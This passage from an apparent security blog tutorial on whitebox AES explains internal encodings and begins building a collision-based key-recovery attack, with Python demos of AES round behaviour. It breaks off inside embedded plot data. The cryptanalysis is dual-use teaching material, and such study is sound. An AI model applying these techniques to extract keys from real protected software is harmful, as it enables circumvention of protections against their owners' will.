<span class=\"n\">original_data</span><span class=\"o\">=</span><span class=\"n\">data</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Recovered key (from encoded state)</span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"n\">k</span><span class=\"p\">)</span>\n</pre> \n   </div> \n   <pre class=\"literal-block\">\n=== Rewind AES round 0 ===\nEncoded state        [188, 188, 47, 234, 125, 125, 125, 125, 125, 125, 125, 125, 125, 125, 125, 125]\nRecovered key (from plain state)     [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\nRecovered key (from encoded state)   [44, 19, 19, 19, 19, 63, 19, 19, 19, 19, 143, 19, 19, 19, 19, 193]\n</pre> \n   <p>So, it seems that the encodings are quite effective! An almighty attacker with debugging capabilities could not recover the key just by reverting the round!</p> \n   <blockquote>\n     Note: In the previous example, we applied the encoding after the round of AES has been performed. In a whiteboxed-AES, this is precomputed in the tables, so you never see the clear state, at any time. \n   </blockquote> \n  </div> \n  <div class=\"section\" id=\"more-about-internal-encodings\"> \n   <h4>More about internal encodings</h4> \n   <p>So, internal encodings are effective, but we are altering AES computations, so that is not really AES anymore? Well, the way internal encodings are used keeps a pure AES. In fact, the encoding applied during a step <span class=\"math\">\\(x\\)</span>, is cancelled during step <span class=\"math\">\\(x+1\\)</span> before applying the new encoding. For instance, let’s take the following encodings for round 0 and 1:</p> \n   <div class=\"math\">\n     \\begin{equation*} f_0(x) = (x+1) \\% 256 \\end{equation*} \n   </div> \n   <div class=\"math\">\n     \\begin{equation*} f_1(x) = (x+2) \\% 256 \\end{equation*} \n   </div> \n   <p>The lookup tables of the round 1 would in fact be created by first using the inverse function of <span class=\"math\">\\(f_0\\)</span>:</p> \n   <div class=\"math\">\n     \\begin{equation*} f^{-1}_0(x) = (x-1) \\% 256 \\end{equation*} \n   </div> \n   <p>And would then apply <span class=\"math\">\\(f_1(x)\\)</span>. All of this precomputed in the lookup tables, so completely invisible to the attacker.</p> \n   <div class=\"figure align-center\"> \n    <img alt=\"encodings\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/encodings.jpg\" style=\"width: 850.52px; height: 72.16px;\" /> \n   </div> \n   <p>There is still one issue though, what happens after the final round? We need to get the same output as a non-whiteboxed, so for sure there can’t be any encodings there (or the decrypted media would not play). So the attacker could just look at the output of the whiteboxed AES, and recover the last round key?</p> \n   <p>Not exactly. When we recovered the round key of round 0, one thing we needed was the previous state (being the first round, the state is just the plain input). Here, even with all powers, we could only observe an encoded state, which does not fit the requirement to rollback the round of AES.</p> \n   <p>Finally, a few things worth mentioning:</p> \n   <ul class=\"simple\"> \n    <li>In the examples we used a really simple (linear) encoding function, that might be trivially cracked by an attacker. Whiteboxes can use much more complex (non-linear) encodings, making bruteforcing of those quite laborious.</li> \n    <li>In the examples, all the bytes were encoded using the same function. Usually, every byte is encoded using a different bijection. (That's not 100% accurate, as the more encodings you have, the bigger your lookup table is. There is a tendency to reuse some of them, or find some kind of tradeoff not to get a massive binary)</li> \n   </ul> \n   <p>If you want to dig further, there are lots of papers dealing with internal encodings (beginning with the original paper of Chow <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id27\" id=\"id10\">[5]</a> ). You can also look for <strong>external encodings</strong> (<a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id24\" id=\"id11\">[2]</a> ) which are another way to protect whiteboxes, but are not the subject of this post. Defeating those implies using different techniques, but the use of external encoding can be quite bothersome to use.</p> \n  </div> \n </div> \n</div> \n<div class=\"section\" id=\"defeating-whiteboxes-a-collision-based-attack\"> \n <h2>Defeating whiteboxes: a collision-based attack</h2> \n <div class=\"section\" id=\"about-whiteboxes-attacks\"> \n  <h3>About whiteboxes attacks</h3> \n  <p>Attacks against whiteboxes exist since the first whitebox design. There are many ways to attack those, from static reversing or encoding recovery, to statistical approaches <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id28\" id=\"id12\">[6]</a> or even fault-based ones <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id29\" id=\"id13\">[7]</a>. There are lots of great posts, papers and presentations out there, but it may not be that easy to understand when you are freshly dropped into the whitebox world.</p> \n  <p>There is another attack that I found while digging around the subject. I find it quite interesting and easy to understand so that is the one we will use to attack a demo whitebox and recover the key.</p> \n  <blockquote>\n    Note: Collisions-based attacks are not new, I believe they have been known for a while as similar attacks were explained both in Chow's original paper and more recently in a 2019 paper by CryptoExperts \n   <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id30\" id=\"id14\">[8]</a>. I can't say for sure they are the same attacks though as I do not speak the Mordor language. \n  </blockquote> \n </div> \n</div> \n<div class=\"section\" id=\"building-an-attack-from-the-ground-up\"> \n <h2>Building an attack from the ground up</h2> \n <blockquote>\n   Note: The following part summarizes the thought process I had while building the attack. If you are already well familiar with AES, you might want to skip a few sections. \n </blockquote> \n <p>Before diving into the attack, we need to figure out a few AES properties that come from the structure of the operations of the algorithm.</p> \n <div class=\"section\" id=\"aes-property-bytes-relationship\"> \n  <h3>AES Property: bytes relationship</h3> \n  <p>As previously listed, there are 4 operations that build a round of AES. Each of them is really specific, and they give interesting cryptographic properties when combined. Those operations combined multiple times (rounds) make AES a strong cryptographic algorithm. However, when combined only a few number of times, they can be exploited to grab some information about the key being used by the algorithm.</p> \n  <p>That is what we will try to do, by analyzing a single round of AES (round 0).</p> \n  <p>Let’s do a round of AES with different plaintexts, and observe what the AES state looks like at the end. More specifically, we will fix the whole plaintext to a stable value, except one byte that we will iterate over [0,255].</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"kn\">import</span> <span class=\"nn\">phoenixAES</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">):</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">AddKey</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">SBox</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">ShiftRow</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"n\">state</span><span class=\"o\">=</span><span class=\"n\">phoenixAES</span><span class=\"o\">.</span><span class=\"n\">MC</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">state</span><span class=\"p\">)</span>\n\n<span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n<span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n<span class=\"n\">states</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">256</span><span class=\"p\">):</span>\n    <span class=\"n\">data</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span>\n    <span class=\"n\">states</span><span class=\"o\">.</span><span class=\"n\">append</span><span class=\"p\">(</span><span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">))</span>\n\n<span class=\"n\">states</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">:</span><span class=\"mi\">4</span><span class=\"p\">]</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\n[[99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99],\n [93, 124, 124, 66, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99],\n [75, 119, 119, 95, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99],\n [83, 123, 123, 75, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]]\n</pre> \n  <p>Interestingly, when we tweak a single input byte, only 4 output bytes are affected. If we plot those values, it becomes quite visible (The graph below is animated, feel free to play around with it :) ).</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"kn\">import</span> <span class=\"nn\">plotly.express</span> <span class=\"k\">as</span> <span class=\"nn\">px</span>\n<span class=\"kn\">import</span> <span class=\"nn\">plotly.graph_objects</span> <span class=\"k\">as</span> <span class=\"nn\">go</span>\n\n<span class=\"n\">fig</span> <span class=\"o\">=</span> <span class=\"n\">go</span><span class=\"o\">.</span><span class=\"n\">Figure</span><span class=\"p\">()</span>\n<span class=\"n\">fig</span><span class=\"o\">.</span><span class=\"n\">update_layout</span><span class=\"p\">(</span>\n    <span class=\"n\">title</span><span class=\"o\">=</span><span class=\"s2\">\"Values of each byte of the state with different plaintext\"</span><span class=\"p\">,</span>\n    <span class=\"n\">xaxis_title</span><span class=\"o\">=</span><span class=\"s2\">\"state byte index\"</span><span class=\"p\">,</span>\n    <span class=\"n\">yaxis_title</span><span class=\"o\">=</span><span class=\"s2\">\"byte value\"</span><span class=\"p\">,</span>\n<span class=\"p\">)</span>\n\n<span class=\"k\">for</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"n\">state</span> <span class=\"ow\">in</span> <span class=\"nb\">enumerate</span><span class=\"p\">(</span><span class=\"n\">states</span><span class=\"p\">):</span>\n    <span class=\"c1\"># Shift data a bit, so it is visible on plot</span>\n    <span class=\"n\">x_values</span> <span class=\"o\">=</span> <span class=\"p\">[(</span><span class=\"mf\">0.001</span><span class=\"o\">*</span><span class=\"n\">i</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"n\">x</span> <span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)]</span>\n    <span class=\"n\">y_values</span> <span class=\"o\">=</span> <span class=\"n\">state</span>\n    <span class=\"n\">fig</span><span class=\"o\">.</span><span class=\"n\">add_trace</span><span class=\"p\">(</span><span class=\"n\">go</span><span class=\"o\">.</span><span class=\"n\">Scatter</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">=</span><span class=\"n\">x_values</span><span class=\"p\">,</span> <span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">y_values</span><span class=\"p\">,</span>\n                        <span class=\"n\">mode</span><span class=\"o\">=</span><span class=\"s1\">'markers'</span><span class=\"p\">,</span>\n                        <span class=\"n\">name</span><span class=\"o\">=</span><span class=\"n\">F</span><span class=\"s2\">\"Plaintext_b0=</span><span class=\"si\">{i}</span><span class=\"s2\">\"</span><span class=\"p\">),</span>\n\n                 <span class=\"p\">)</span>\n\n<span class=\"n\">fig</span><span class=\"o\">.</span><span class=\"n\">show</span><span class=\"p\">()</span>\n</pre> \n  </div> \n  <div> \n   <div id=\"4d42a43a-d31f-41c8-a94b-63e7e58b551b\" class=\"plotly-graph-div\" style=\"height:525px; width:100%;\"></div> \n   <script type=\"text/javascript\"> window.PLOTLYENV=window.PLOTLYENV || {}; if (document.getElementById(\"4d42a43a-d31f-41c8-a94b-63e7e58b551b\")) { Plotly.newPlot( '4d42a43a-d31f-41c8-a94b-63e7e58b551b', [{\"mode\": \"markers\", \"name\": \"Plaintext_b0=0\", \"type\": \"scatter\", \"x\": [0.0, 1.0, 2.0, 3.0, 4.0, 5.0, 6.0, 7.0, 8.0, 9.0, 10.0, 11.0, 12.0, 13.0, 14.0, 15.0], \"y\": [99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=1\", \"type\": \"scatter\", \"x\": [0.001, 1.001, 2.001, 3.001, 4.001, 5.001, 6.001, 7.001, 8.001, 9.001, 10.001, 11.001, 12.001, 13.001, 14.001, 15.001], \"y\": [93, 124, 124, 66, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=2\", \"type\": \"scatter\", \"x\": [0.002, 1.002, 2.002, 3.002, 4.002, 5.002, 6.002, 7.002, 8.002, 9.002, 10.002, 11.002, 12.002, 13.002, 14.002, 15.002], \"y\": [75, 119, 119, 95, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=3\", \"type\": \"scatter\", \"x\": [0.003, 1.003, 2.003, 3.003, 4.003, 5.003, 6.003, 7.003, 8.003, 9.003, 10.003, 11.003, 12.003, 13.003, 14.003, 15.003], \"y\": [83, 123, 123, 75, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=4\", \"type\": \"scatter\", \"x\": [0.004, 1.004, 2.004, 3.004, 4.004, 5.004, 6.004, 7.004, 8.004, 9.004, 10.004, 11.004, 12.004, 13.004, 14.004, 15.004], \"y\": [90, 242, 242, 203, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=5\", \"type\": \"scatter\", \"x\": [0.005, 1.005, 2.005, 3.005, 4.005, 5.005, 6.005, 7.005, 8.005, 9.005, 10.005, 11.005, 12.005, 13.005, 14.005, 15.005], \"y\": [115, 107, 107, 123, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=6\", \"type\": \"scatter\", \"x\": [0.006, 1.006, 2.006, 3.006, 4.006, 5.006, 6.006, 7.006, 8.006, 9.006, 10.006, 11.006, 12.006, 13.006, 14.006, 15.006], \"y\": [123, 111, 111, 119, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=7\", \"type\": \"scatter\", \"x\": [0.007, 1.007, 2.007, 3.007, 4.007, 5.007, 6.007, 7.007, 8.007, 9.007, 10.007, 11.007, 12.007, 13.007, 14.007, 15.007], \"y\": [52, 197, 197, 146, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=8\", \"type\": \"scatter\", \"x\": [0.008, 1.008, 2.008, 3.008, 4.008, 5.008, 6.008, 7.008, 8.008, 9.008, 10.008, 11.008, 12.008, 13.008, 14.008, 15.008], \"y\": [197, 48, 48, 150, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=9\", \"type\": \"scatter\", \"x\": [0.009000000000000001, 1.009, 2.009, 3.009, 4.009, 5.009, 6.009, 7.009, 8.009, 9.009, 10.009, 11.009, 12.009, 13.009, 14.009, 15.009], \"y\": [167, 1, 1, 197, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=10\", \"type\": \"scatter\", \"x\": [0.01, 1.01, 2.01, 3.01, 4.01, 5.01, 6.01, 7.01, 8.01, 9.01, 10.01, 11.01, 12.01, 13.01, 14.01, 15.01], \"y\": [107, 103, 103, 111, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=11\", \"type\": \"scatter\", \"x\": [0.011, 1.011, 2.011, 3.011, 4.011, 5.011, 6.011, 7.011, 8.011, 9.011, 10.011, 11.011, 12.011, 13.011, 14.011, 15.011], \"y\": [243, 43, 43, 187, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=12\", \"type\": \"scatter\", \"x\": [0.012, 1.012, 2.012, 3.012, 4.012, 5.012, 6.012, 7.012, 8.012, 9.012, 10.012, 11.012, 12.012, 13.012, 14.012, 15.012], \"y\": [66, 254, 254, 223, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=13\", \"type\": \"scatter\", \"x\": [0.013000000000000001, 1.013, 2.013, 3.013, 4.013, 5.013, 6.013, 7.013, 8.013, 9.013, 10.013, 11.013, 12.013, 13.013, 14.013, 15.013], \"y\": [16, 215, 215, 164, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=14\", \"type\": \"scatter\", \"x\": [0.014, 1.014, 2.014, 3.014, 4.014, 5.014, 6.014, 7.014, 8.014, 9.014, 10.014, 11.014, 12.014, 13.014, 14.014, 15.014], \"y\": [232, 171, 171, 32, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=15\", \"type\": \"scatter\", \"x\": [0.015, 1.015, 2.015, 3.015, 4.015, 5.015, 6.015, 7.015, 8.015, 9.015, 10.015, 11.015, 12.015, 13.015, 14.015, 15.015], \"y\": [73, 118, 118, 92, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=16\", \"type\": \"scatter\", \"x\": [0.016, 1.016, 2.016, 3.016, 4.016, 5.016, 6.016, 7.016, 8.016, 9.016, 10.016, 11.016, 12.016, 13.016, 14.016, 15.016], \"y\": [42, 202, 202, 131, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=17\", \"type\": \"scatter\", \"x\": [0.017, 1.017, 2.017, 3.017, 4.017, 5.017, 6.017, 7.017, 8.017, 9.017, 10.017, 11.017, 12.017, 13.017, 14.017, 15.017], \"y\": [186, 130, 130, 91, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=18\", \"type\": \"scatter\", \"x\": [0.018000000000000002, 1.018, 2.018, 3.018, 4.018, 5.018, 6.018, 7.018, 8.018, 9.018, 10.018, 11.018, 12.018, 13.018, 14.018, 15.018], \"y\": [44, 201, 201, 134, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=19\", \"type\": \"scatter\", \"x\": [0.019, 1.019, 2.019, 3.019, 4.019, 5.019, 6.019, 7.019, 8.019, 9.019, 10.019, 11.019, 12.019, 13.019, 14.019, 15.019], \"y\": [95, 125, 125, 65, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=20\", \"type\": \"scatter\", \"x\": [0.02, 1.02, 2.02, 3.02, 4.02, 5.02, 6.02, 7.02, 8.02, 9.02, 10.02, 11.02, 12.02, 13.02, 14.02, 15.02], \"y\": [74, 250, 250, 211, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=21\", \"type\": \"scatter\", \"x\": [0.021, 1.021, 2.021, 3.021, 4.021, 5.021, 6.021, 7.021, 8.021, 9.021, 10.021, 11.021, 12.021, 13.021, 14.021, 15.021], \"y\": [23, 89, 89, 45, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=22\", \"type\": \"scatter\", \"x\": [0.022, 1.022, 2.022, 3.022, 4.022, 5.022, 6.022, 7.022, 8.022, 9.022, 10.022, 11.022, 12.022, 13.022, 14.022, 15.022], \"y\": [43, 71, 71, 15, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=23\", \"type\": \"scatter\", \"x\": [0.023, 1.023, 2.023, 3.023, 4.023, 5.023, 6.023, 7.023, 8.023, 9.023, 10.023, 11.023, 12.023, 13.023, 14.023, 15.023], \"y\": [94, 240, 240, 205, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=24\", \"type\": \"scatter\", \"x\": [0.024, 1.024, 2.024, 3.024, 4.024, 5.024, 6.024, 7.024, 8.024, 9.024, 10.024, 11.024, 12.024, 13.024, 14.024, 15.024], \"y\": [228, 173, 173, 42, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=25\", \"type\": \"scatter\", \"x\": [0.025, 1.025, 2.025, 3.025, 4.025, 5.025, 6.025, 7.025, 8.025, 9.025, 10.025, 11.025, 12.025, 13.025, 14.025, 15.025], \"y\": [22, 212, 212, 161, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=26\", \"type\": \"scatter\", \"x\": [0.026000000000000002, 1.026, 2.026, 3.026, 4.026, 5.026, 6.026, 7.026, 8.026, 9.026, 10.026, 11.026, 12.026, 13.026, 14.026, 15.026], \"y\": [250, 162, 162, 59, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=27\", \"type\": \"scatter\", \"x\": [0.027, 1.027, 2.027, 3.027, 4.027, 5.027, 6.027, 7.027, 8.027, 9.027, 10.027, 11.027, 12.027, 13.027, 14.027, 15.027], \"y\": [224, 175, 175, 44, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=28\", \"type\": \"scatter\", \"x\": [0.028, 1.028, 2.028, 3.028, 4.028, 5.028, 6.028, 7.028, 8.028, 9.028, 10.028, 11.028, 12.028, 13.028, 14.028, 15.028], \"y\": [134, 156, 156, 121, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=29\", \"type\": \"scatter\", \"x\": [0.029, 1.029, 2.029, 3.029, 4.029, 5.029, 6.029, 7.029, 8.029, 9.029, 10.029, 11.029, 12.029, 13.029, 14.029, 15.029], \"y\": [246, 164, 164, 49, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=30\", \"type\": \"scatter\", \"x\": [0.03, 1.03, 2.03, 3.03, 4.03, 5.03, 6.03, 7.03, 8.03, 9.03, 10.03, 11.03, 12.03, 13.03, 14.03, 15.03], \"y\": [65, 114, 114, 80, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=31\", \"type\": \"scatter\", \"x\": [0.031, 1.031, 2.031, 3.031, 4.031, 5.031, 6.031, 7.031, 8.031, 9.031, 10.031, 11.031, 12.031, 13.031, 14.031, 15.031], \"y\": [62, 192, 192, 157, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=32\", \"type\": \"scatter\", \"x\": [0.032, 1.032, 2.032, 3.032, 4.032, 5.032, 6.032, 7.032, 8.032, 9.032, 10.032, 11.032, 12.032, 13.032, 14.032, 15.032], \"y\": [208, 183, 183, 4, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=33\", \"type\": \"scatter\", \"x\": [0.033, 1.033, 2.033, 3.033, 4.033, 5.033, 6.033, 7.033, 8.033, 9.033, 10.033, 11.033, 12.033, 13.033, 14.033, 15.033], \"y\": [68, 253, 253, 218, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=34\", \"type\": \"scatter\", \"x\": [0.034, 1.034, 2.034, 3.034, 4.034, 5.034, 6.034, 7.034, 8.034, 9.034, 10.034, 11.034, 12.034, 13.034, 14.034, 15.034], \"y\": [152, 147, 147, 104, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=35\", \"type\": \"scatter\", \"x\": [0.035, 1.035, 2.035, 3.035, 4.035, 5.035, 6.035, 7.035, 8.035, 9.035, 10.035, 11.035, 12.035, 13.035, 14.035, 15.035], \"y\": [233, 38, 38, 172, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=36\", \"type\": \"scatter\", \"x\": [0.036000000000000004, 1.036, 2.036, 3.036, 4.036, 5.036, 6.036, 7.036, 8.036, 9.036, 10.036, 11.036, 12.036, 13.036, 14.036, 15.036], \"y\": [201, 54, 54, 156, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=37\", \"type\": \"scatter\", \"x\": [0.037, 1.037, 2.037, 3.037, 4.037, 5.037, 6.037, 7.037, 8.037, 9.037, 10.037, 11.037, 12.037, 13.037, 14.037, 15.037], \"y\": [219, 63, 63, 135, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=38\", \"type\": \"scatter\", \"x\": [0.038, 1.038, 2.038, 3.038, 4.038, 5.038, 6.038, 7.038, 8.038, 9.038, 10.038, 11.038, 12.038, 13.038, 14.038, 15.038], \"y\": [80, 247, 247, 196, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=39\", \"type\": \"scatter\", \"x\": [0.039, 1.039, 2.039, 3.039, 4.039, 5.039, 6.039, 7.039, 8.039, 9.039, 10.039, 11.039, 12.039, 13.039, 14.039, 15.039], \"y\": [38, 204, 204, 137, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=40\", \"type\": \"scatter\", \"x\": [0.04, 1.04, 2.04, 3.04, 4.04, 5.04, 6.04, 7.04, 8.04, 9.04, 10.04, 11.04, 12.04, 13.04, 14.04, 15.04], \"y\": [205, 52, 52, 154, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=41\", \"type\": \"scatter\", \"x\": [0.041, 1.041, 2.041, 3.041, 4.041, 5.041, 6.041, 7.041, 8.041, 9.041, 10.041, 11.041, 12.041, 13.041, 14.041, 15.041], \"y\": [244, 165, 165, 50, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=42\", \"type\": \"scatter\", \"x\": [0.042, 1.042, 2.042, 3.042, 4.042, 5.042, 6.042, 7.042, 8.042, 9.042, 10.042, 11.042, 12.042, 13.042, 14.042, 15.042], \"y\": [116, 229, 229, 242, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=43\", \"type\": \"scatter\", \"x\": [0.043000000000000003, 1.043, 2.043, 3.043, 4.043, 5.043, 6.043, 7.043, 8.043, 9.043, 10.043, 11.043, 12.043, 13.043, 14.043, 15.043], \"y\": [92, 241, 241, 206, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=44\", \"type\": \"scatter\", \"x\": [0.044, 1.044, 2.044, 3.044, 4.044, 5.044, 6.044, 7.044, 8.044, 9.044, 10.044, 11.044, 12.044, 13.044, 14.044, 15.044], \"y\": [71, 113, 113, 85, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=45\", \"type\": \"scatter\", \"x\": [0.045, 1.045, 2.045, 3.045, 4.045, 5.045, 6.045, 7.045, 8.045, 9.045, 10.045, 11.045, 12.045, 13.045, 14.045, 15.045], \"y\": [14, 216, 216, 181, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=46\", \"type\": \"scatter\", \"x\": [0.046, 1.046, 2.046, 3.046, 4.046, 5.046, 6.046, 7.046, 8.046, 9.046, 10.046, 11.046, 12.046, 13.046, 14.046, 15.046], \"y\": [199, 49, 49, 149, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=47\", \"type\": \"scatter\", \"x\": [0.047, 1.047, 2.047, 3.047, 4.047, 5.047, 6.047, 7.047, 8.047, 9.047, 10.047, 11.047, 12.047, 13.047, 14.047, 